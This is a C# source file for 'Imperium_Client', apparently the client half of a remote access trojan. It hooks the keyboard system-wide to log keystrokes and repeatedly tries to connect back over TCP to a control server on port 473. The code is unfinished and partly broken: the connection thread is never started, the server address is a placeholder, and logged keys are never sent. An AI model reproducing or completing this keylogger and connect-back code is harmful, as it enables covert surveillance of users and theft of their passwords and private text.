using System;
using ImperiumLibrary.Networking.TCP;
using ImperiumLibrary.Miscellenious.GlobalVariables;
using ImperiumLibrary.User.Monitor.Keyhook;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Imperium_Client;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;

namespace Imperium_Client
{
    class Program
    {
        public Program()
        {
            Variables.EnableKeylogger = false;
        }
        private static LowLevelKeyboardListener Listener = new LowLevelKeyboardListener();
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);
        private static StringBuilder Keylogs = new StringBuilder();
        static void Main(string[] args)
        { 

        Thread Connector = new Thread(new ThreadStart(ConnectToServer));
            if (Variables.EnableKeylogger)
            {
                CollectLogs();
            }
            Application.Run();
}


        private static void CollectLogs()
        {
            Listener.HookKeyboard();
            Listener.OnKeyPressed += _listener_OnKeyPressed;
        }

        private static void _listener_OnKeyPressed(object sender, KeyPressedArgs e)
        {
            bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
            if (CapsLock)
            {
                Keylogs.Append(e.KeyPressed.ToString().ToUpper());
            }
            else
            {
                Keylogs.Append(e.KeyPressed.ToString().ToLower());
            }

        }

        private static void ConnectToServer()
        {
            Variables.TCPClient = new TcpClient();
            Variables.Port = 473;
            Variables.ConnectTo = IPAddress.Any.ToString();
            bool IsIPAddress = IPAddress.TryParse(Variables.ConnectTo, out Variables.IPAddress);
            switch (IsIPAddress)
            {
                case true:
                    Variables.IPAddress = IPAddress.Parse(Variables.ConnectTo);
                    break;
                case false:
                    Variables.IPAddress = Dns.GetHostAddresses(Variables.ConnectTo)[0];
                    break;
            }
            try
            {
                do
                {
                    Variables.TCPClient.Connect((Variables.IPAddress), Variables.Port);
                    Thread.Sleep(10);
                } while (!Variables.TCPClient.Connected);
            }
            catch (Exception)
            {
            }
        }
    
}
}